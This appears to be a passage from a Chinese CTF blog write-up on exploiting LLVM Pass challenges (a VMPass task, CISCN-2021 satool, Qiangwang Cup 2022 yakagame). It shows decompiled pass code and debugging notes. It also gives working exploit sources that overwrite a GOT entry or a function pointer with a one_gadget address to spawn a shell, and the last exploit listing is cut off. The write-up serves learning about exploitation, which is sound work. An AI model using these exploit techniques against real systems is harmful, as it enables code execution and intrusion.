( v22 == <span class="number">1</span> )</span><br><span class="line">                v24 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">                v24 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v24 == off_20DFD0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( v24 == off_20DFC0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="comment">//arg0: 1 -&gt; *off_20DFD0 = **off_20DFC0</span></span><br><span class="line">          <span class="comment">//arg0: 2 -&gt; *off_20DFC0 = **off_20DFD0</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;load&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v21 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            v20 = <span class="number">0LL</span>;</span><br><span class="line">            v19 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v21);</span><br><span class="line">            <span class="keyword">if</span> ( v19 )</span><br><span class="line">            &#123;</span><br><span class="line">              v18 = llvm::ConstantInt::getZExtValue(v19);</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">                v20 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">                v20 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == off_20DFD0 )</span><br><span class="line">              *(_QWORD *)off_20DFC0 = **(_QWORD **)off_20DFD0;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == off_20DFC0 )</span><br><span class="line">              *(_QWORD *)off_20DFD0 = **(_QWORD **)off_20DFC0;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="comment">//arg0: 1 -&gt; *off_20DFD0 += arg1</span></span><br><span class="line">          <span class="comment">//arg0: 2 -&gt; *off_20DFC0 += arg1</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;add&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v17 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            v16 = <span class="number">0LL</span>;</span><br><span class="line">            v15 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">            <span class="keyword">if</span> ( v15 )</span><br><span class="line">            &#123;</span><br><span class="line">              v14 = llvm::ConstantInt::getZExtValue(v15);</span><br><span class="line">              <span class="keyword">if</span> ( v14 == <span class="number">1</span> )</span><br><span class="line">                v16 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v14 == <span class="number">2</span> )</span><br><span class="line">                v16 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v16 )</span><br><span class="line">            &#123;</span><br><span class="line">              v13 = llvm::CallBase::getArgOperand(v35, <span class="number">1u</span>);</span><br><span class="line">              v12 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">              <span class="keyword">if</span> ( v12 )</span><br><span class="line">                *v16 += llvm::ConstantInt::getZExtValue(v12);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="comment">//arg0: 1 -&gt; *off_20DFD0 -= arg1</span></span><br><span class="line">          <span class="comment">//arg0: 2 -&gt; *off_20DFC0 -= arg1</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;min&quot;</span>) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">          v10 = <span class="number">0LL</span>;</span><br><span class="line">          v9 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v11);</span><br><span class="line">          <span class="keyword">if</span> ( v9 )</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = llvm::ConstantInt::getZExtValue(v9);</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">              v10 = off_20DFD0;</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">              v10 = off_20DFC0;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v10 )</span><br><span class="line">          &#123;</span><br><span class="line">            v7 = llvm::CallBase::getArgOperand(v35, <span class="number">1u</span>);</span><br><span class="line">            v6 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v7);</span><br><span class="line">            <span class="keyword">if</span> ( v6 )</span><br><span class="line">              *v10 -= llvm::ConstantInt::getZExtValue(v6);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(s1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v39,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>总体总结如下，<code>pop</code>和<code>push</code>与漏洞没什么关系</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">store:</span><br><span class="line">    arg0:1 -&gt; **off_20DFC0 = *off_20DFD0</span><br><span class="line">    arg0:2 -&gt; **off_20DFD0 = *off_20DFC0</span><br><span class="line">    </span><br><span class="line">load:</span><br><span class="line">    arg0: 1 -&gt; *off_20DFC0 = **off_20DFD0</span><br><span class="line">    arg0: 2 -&gt; *off_20DFD0 = **off_20DFC0</span><br><span class="line">    </span><br><span class="line">add:</span><br><span class="line">    arg0: 1 -&gt; *off_20DFD0 += arg1</span><br><span class="line">    arg0: 2 -&gt; *off_20DFC0 += arg1 </span><br><span class="line">    </span><br><span class="line">min:</span><br><span class="line">    arg0: 1 -&gt; *off_20DFD0 -= arg1</span><br><span class="line">    arg0: 2 -&gt; *off_20DFC0 -= arg1</span><br></pre></td></tr></table></div></figure>

<p>相当于现在可控任意两个指针<code>reg1/reg2</code>，并且可以取其中一个指针的值赋值给另一个指针。</p>

        <h3 id="简单调试"   >
          <a href="#简单调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#简单调试" class="headerlink" title="简单调试"></a>简单调试</h3>
      <p>先写一下简单程序调试一下，由于题目给的是<code>opt-8</code>，所以最好我们安装的也是对应版本的，即</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install clang-8</span><br><span class="line">sudo apt install llvm-8</span><br></pre></td></tr></table></div></figure>

<p>对应的调试程序为</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> num, <span class="keyword">long</span> <span class="keyword">long</span> val)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> num, <span class="keyword">long</span> <span class="keyword">long</span> val)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(<span class="keyword">int</span> num)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(<span class="keyword">int</span> num)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">o0o0o0o0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    load(<span class="number">1</span>);</span><br><span class="line">    load(<span class="number">2</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">    store(<span class="number">2</span>);</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x1000</span>);</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x1000</span>);</span><br><span class="line">    min(<span class="number">1</span>, <span class="number">0x1000</span>);</span><br><span class="line">    min(<span class="number">1</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>使用命令<code>clang-8 -emit-llvm -S myDebug.c -o myDebug.ll</code>编译生成<code>myDebug</code>，随后在<code>IDA</code>进行远程调试，如下配置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230828150159620.png" alt="image-20230828150159620"></p>
<p>即可进行调试，通过调试可以想出利用步骤如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">reg1 = 0</span><br><span class="line">reg2 = 0</span><br><span class="line"></span><br><span class="line">add(1,free_got)</span><br><span class="line">//控制reg1指针为opt程序中的got表地址free_got</span><br><span class="line">reg1 += free_got</span><br><span class="line"></span><br><span class="line">load(1)</span><br><span class="line">reg2 = *reg1 = free_addr</span><br><span class="line">//使得reg2指针为free_addr</span><br><span class="line"></span><br><span class="line">add(2,offset)</span><br><span class="line">//使得reg2指针为one_gadget</span><br><span class="line"></span><br><span class="line">store(1)</span><br><span class="line">//将reg2指针的值one_gadget赋值给reg1指向的值，即修改free_got为one_gadget</span><br></pre></td></tr></table></div></figure>


        <h3 id="漏洞利用"   >
          <a href="#漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3>
      <p><code>checksec</code>一下<code>opt</code>，一般不存在<code>PIE</code>，那么指向<code>opt</code>程序的<code>got</code>表就很轻松了，最终<code>exp</code>如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">o0o0o0o0</span><span class="params">()</span></span>&#123;</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x77e100</span>);</span><br><span class="line">    load(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0</span> - <span class="number">0x9a6d0</span> + <span class="number">0xe3b04</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>使用命令编译后运行即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang-8 -emit-llvm -S myExp.c -o myExp.ll</span><br><span class="line">opt-8 -load ./VMPass.so -VMPass myExp.ll</span><br></pre></td></tr></table></div></figure>

<p>需要注意的是，这里修改的是<code>opt</code>程序中的<code>free_got</code>，也需要程序<code>opt</code>程序调用才行，同时满足一些寄存器的设置，那么有时候可能不太满足<code>One_gadget</code>，那么多试试几个<code>got</code>也行。另外<code>IDA</code>远程调试的时候一些偏移可能有点问题，最好还是在<code>gdb</code>中寻找，使用如下命令</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./opt-8</span><br><span class="line">set args -load ./VMPass.so -VMPass ./myExp.ll</span><br></pre></td></tr></table></div></figure>

<p>同时有时候从<code>opt-8</code>开始的时候不好确定加载的<code>.so</code>是在什么时候加载的，通常是<code>winmt</code>师傅找到的如下情况</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/949925_AFDQ35JVS6KKT6Y.png" alt="img"></p>

        <h2 id="CISCN-2021-satool"   >
          <a href="#CISCN-2021-satool" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN-2021-satool" class="headerlink" title="CISCN-2021-satool"></a>CISCN-2021-satool</h2>
      
        <h3 id="漏洞分析-1"   >
          <a href="#漏洞分析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3>
      <p>分析漏洞，老套路，搜索<code>vtable</code>和<code>start</code>函数，得到<code>runOnFunction</code>函数和位置注册名为<code>SAPass</code>，进入分析</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094305721.png" alt="image-20230829094305721"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094320046.png" alt="image-20230829094320046"></p>
<p>进入runOnFunction进行分析，首先是获取到解析的函数名称，这是硬编码的小端序</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094428297.png" alt="image-20230829094428297"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094523936.png" alt="image-20230829094523936"></p>
<p>那么实际匹配的函数名称应该为<code>B4ckDo0r</code>，之后就有一堆奇奇怪怪的代码，暂时先不用管，仔细寻找字符串匹配的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094630811.png" alt="image-20230829094630811"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094642785.png" alt="image-20230829094642785"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094654104.png" alt="image-20230829094654104"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094701499.png" alt="image-20230829094701499"></p>

        <h3 id="简单调试-1"   >
          <a href="#简单调试-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#简单调试-1" class="headerlink" title="简单调试"></a>简单调试</h3>
      <p>再简单写一个例子，通过调试进行分析，可以确定大致的函数名称、参数对应的模板如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">char</span> *b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stealkey</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fakekey</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	save(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    takeaway(<span class="number">0</span>);</span><br><span class="line">	stealkey();</span><br><span class="line">	fakekey(<span class="number">0x1111</span>);</span><br><span class="line">	run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>在调试过程中发现涉及到堆，但是<code>IDA</code>不太好查看堆的结构，可以用一下插件：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/danigargu/heap-viewer" >danigargu/heap-viewer: IDA Pro plugin to examine the glibc heap, focused on exploit development (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>最终发现那一堆乱七八糟的代码都是一些检查，最终的函数大致功能如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">save:</span><br><span class="line">	save(arg0,arg1);</span><br><span class="line">	byte_2040f8 = chunk_addr</span><br><span class="line">	//申请0x18的chunk，将arg0的内容放到chunk，arg1的内容放到chunk + 8</span><br><span class="line">	//如果申请了0x10及以上的chunk，由于判断代码会导致释放，不过其实也可以溢出的，只是会释放而已。</span><br><span class="line">	//这个应该也可以进行相关利用的</span><br><span class="line"></span><br><span class="line">takeaway:</span><br><span class="line">	//不分析，和漏洞无关</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">stealkey:</span><br><span class="line">	stealkey()</span><br><span class="line">	//将*byte_2040f8赋值给byte_204100</span><br><span class="line"></span><br><span class="line">fakekey:</span><br><span class="line">	fakekey(arg0)</span><br><span class="line">	*byte_2040f8 = byte_204100 + arg0</span><br><span class="line">	</span><br><span class="line">run:</span><br><span class="line">	*byte_2040f8()</span><br></pre></td></tr></table></div></figure>


        <h3 id="漏洞利用-1"   >
          <a href="#漏洞利用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3>
      <p>那么申请残留<code>libc</code>的<code>chunk</code>，修改残留的<code>libc</code>地址为<code>one_gadget</code>即可，然后<code>run</code>即可完成利用，在<code>save</code>的<code>malloc</code>之前下断点，查看堆状态</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829141734303.png" alt="image-20230829141734303"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829141743890.png" alt="image-20230829141743890"></p>
<p><code>tcache</code>有一个<code>0x20</code>的<code>chunk</code>，随后就会从<code>smallbins</code>中申请，那么申请两次之后，得到残留<code>libc</code>的<code>chunk</code>，然后使用<code>stealkey</code>将残留<code>libc</code>赋值给<code>byte_204100</code>，之后又使用<code>fakekey</code>进行修改将<code>byte_204100</code>的残留<code>libc</code>进行加减操作得到<code>one_gadget</code>，赋值给<code>*byte_2040f8</code>，通过<code>run</code>调用<code>*byte_2040f8</code>即可调用到<code>one_gadget</code>。</p>
<p>最终<code>exp</code>如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -emit-llvm -S exp.c -o exp.ll</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">char</span> *b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stealkey</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fakekey</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;&quot;</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    stealkey();</span><br><span class="line">    fakekey(<span class="number">-0x1ecbf0</span>+<span class="number">0xe3afe</span>);</span><br><span class="line">    run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="强网杯-2022-yakagame"   >
          <a href="#强网杯-2022-yakagame" class="heading-link"><i class="fas fa-link"></i></a><a href="#强网杯-2022-yakagame" class="headerlink" title="强网杯-2022 yakagame"></a>强网杯-2022 yakagame</h2>
      
        <h3 id="漏洞分析-2"   >
          <a href="#漏洞分析-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3>
      <p>直接<code>shift+F12</code>查看字符串，发现<code>flag</code>，交叉引用进入查看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829145039943.png" alt="image-20230829145039943"></p>
<p><code>sub_C650</code>查看是注册函数，依照惯例注册名应该为<code>ayaka</code>通过<code>vtable</code>找到<code>runOnFunction</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829145538577.png" alt="image-20230829145538577"></p>
<p>处理函数为<code>gamestart</code>，分析找到内部处理函数有<code>fight</code>，并且满足<code>score</code>达成目标之后可以调用到后门，</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829145854503.png" alt="image-20230829145854503"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829145951845.png" alt="image-20230829145951845"></p>
<p>那么主要分析点就是如何操作的<code>score</code>以及<code>cmd</code>如何赋值。经过分析，重点的漏洞在<code>else</code>分支</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829171103523.png" alt="image-20230829171103523"></p>
<p>在<code>else</code>分支中，不满足以上所有函数的匹配的其他函数，会进入该分支，遍历<code>funMap</code>，如果<code>funMap</code>中存在对应关系<code>funMap[func_name] = value</code>，则作<code>weaponlist[idx] = value</code>操作，如果不存在，则添加对应关系<code>funMap[func_name] = value</code></p>
<p>这里的<code>idx</code>是<code>char</code>型的，在每一次进入<code>else</code>分支都会进行遍历<code>funMap</code>的，那么<code>funMap</code>中如果存在很多项，导致匹配到某个已存在的函数时，<code>idx</code>在<code>-128~-1</code>之间，那么就会导致<code>weaponlist</code>数组向上溢出了，从而能够覆盖到在<code>weaponlist</code>上方的<code>score</code>和<code>cmd</code>，完成劫持利用。</p>

        <h3 id="漏洞利用-2"   >
          <a href="#漏洞利用-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3>
      <p>那么就通过计算生成对应<code>idx</code>的函数进行覆盖即可，<code>cmd</code>可以让其指向<code>opt</code>程序中<code>sh</code>的指针，最终<code>winmt</code>师傅的<code>exp</code>如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span 